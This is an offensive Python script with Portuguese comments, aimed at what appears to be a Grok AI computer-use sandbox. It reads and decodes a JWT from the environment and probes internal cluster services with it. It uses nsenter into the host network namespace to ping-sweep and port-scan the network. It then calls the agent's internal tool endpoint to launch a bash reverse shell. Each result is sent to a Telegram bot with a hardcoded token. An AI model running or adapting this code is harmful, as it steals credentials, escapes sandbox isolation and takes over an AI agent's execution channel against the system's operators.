#!/usr/bin/env python3
"""
Exploração avançada fora da caixa.
Usa JWT, proxy interno, rede interna e API do Grok.
"""

import subprocess
import json
import requests
import os
import time
import socket
import struct
from datetime import datetime
import base64

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def decode_jwt(token):
    """Decodifica o JWT (sem verificar assinatura)."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return "JWT inválido"
        payload = parts[1]
        # Adicionar padding se necessário
        payload += '=' * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload).decode('utf-8')
        return json.loads(decoded)
    except Exception as e:
        return f"Erro: {e}"

def test_internal_services(jwt):
    """Testa acesso a serviços internos com o JWT."""
    services = [
        ("Grok Files", "https://files.grok.com", "/v1/"),  # endpoint hipotético
        ("Polygon Proxy", "http://polygon-proxy.hades-openbar.svc.cluster.local", "/"),
        ("Coingecko Proxy", "http://coingecko-proxy.hades-openbar.svc.cluster.local", "/api/v3/ping"),
    ]
    results = {}
    for name, base, path in services:
        url = base + path
        headers = {"Authorization": f"Bearer {jwt}"}
        try:
            r = requests.get(url, headers=headers, timeout=5)
            results[name] = f"Status: {r.status_code} - {r.text[:200]}"
        except Exception as e:
            results[name] = f"Erro: {e}"
    return results

def scan_network():
    """Faz um ping sweep básico na rede 172.16.0.0/24 (limitado)."""
    # Usa nsenter para executar ping no namespace do host
    cmd = 'for i in {1..254}; do nsenter -t 1 -n -- ping -c 1 -W 1 172.16.0.$i | grep "bytes from" && echo "Alive: 172.16.0.$i" & done'
    output = run(cmd)
    return output

def port_scan(hosts):
    """Escaneia portas comuns em hosts descobertos (simplificado)."""
    ports = [80, 443, 6443, 8080, 9090, 4242, 8081, 8082, 22, 2379, 10250]
    results = {}
    for host in hosts:
        for port in ports:
            # Usa nc via nsenter
            cmd = f"nsenter -t 1 -n -- timeout 2 nc -zv {host} {port} 2>&1"
            out = run(cmd)
            if "succeeded" in out or "open" in out:
                results[f"{host}:{port}"] = out
    return results

def call_grok_api(jwt):
    """Tenta executar um comando via a API interna do grok-computer-server."""
    # O processo node /app/grok-computer-server.mjs escuta na porta 4242
    # Vimos no ps que ele aceita requisições POST para /sessions/{session}/tools/call
    # Vamos tentar criar uma nova sessão ou usar a existente (UUID no ps)
    # Primeiro, listar sessões:
    url = "http://127.0.0.1:4242/sessions"
    try:
        r = requests.get(url, headers={"Authorization": f"Bearer {jwt}"})
        sessions = r.json().get('sessions', [])
    except:
        sessions = []
    if not sessions:
        # Tenta criar uma nova sessão
        try:
            r = requests.post("http://127.0.0.1:4242/sessions", headers={"Authorization": f"Bearer {jwt}"})
            session_id = r.json().get('id')
        except:
            return "Não foi possível obter sessão"
    else:
        session_id = sessions[0]
    # Executar um comando (ex: reverse shell)
    # Vamos usar a ferramenta 'bash' com um comando que faça uma conexão reversa
    # (substitua IP e porta pelo seu listener)
    cmd = {
        "method": "tools/call",
        "params": {
            "name": "bash",
            "arguments": {
                "command": "bash -c 'bash -i >& /dev/tcp/SEU_IP/SUA_PORTA 0>&1'",
                "timeout": "120"
            }
        }
    }
    try:
        r = requests.post(
            f"http://127.0.0.1:4242/sessions/{session_id}/tools/call",
            headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
            json=cmd,
            timeout=5
        )
        return r.json()
    except Exception as e:
        return f"Erro: {e}"

def main():
    send_telegram("🚀 **Iniciando exploração avançada (fora da caixa)**")

    # 1. Decodificar JWT
    jwt_token = os.getenv("TERMINAL_JWT_VAL", "")
    if jwt_token:
        payload = decode_jwt(jwt_token)
        send_telegram(f"📄 **JWT Decodificado**\n```\n{json.dumps(payload, indent=2)[:3000]}\n```")
    else:
        send_telegram("❌ JWT não encontrado.")

    # 2. Testar serviços internos
    if jwt_token:
        results = test_internal_services(jwt_token)
        send_telegram("🔍 **Teste de serviços internos**")
        for name, res in results.items():
            send_telegram(f"📄 **{name}**\n```\n{res[:500]}\n```")

    # 3. Scan de rede
    send_telegram("🔍 **Scan de rede (ping sweep)**")
    alive = scan_network()
    send_telegram(f"📄 **Hosts ativos**\n```\n{alive[:2000]}\n```")

    # Extrair IPs ativos (simplificado)
    alive_ips = []
    for line in alive.splitlines():
        if "Alive:" in line:
            ip = line.split()[-1]
            if ip not in alive_ips:
                alive_ips.append(ip)

    # 4. Port scan nos IPs encontrados
    if alive_ips:
        send_telegram(f"🔍 **Scan de portas em {alive_ips[:5]}**")
        port_results = port_scan(alive_ips[:5])
        for k, v in port_results.items():
            send_telegram(f"📄 **{k}**\n```\n{v}\n```")

    # 5. Tentar abusar da API do Grok
    if jwt_token:
        send_telegram("🔄 **Tentando executar comando via API Grok**")
        response = call_grok_api(jwt_token)
        send_telegram(f"📄 **Resposta da API**\n```\n{json.dumps(response, indent=2)[:2000]}\n```")

    send_telegram("✅ **Exploração avançada finalizada**")

if __name__ == "__main__":
    main()
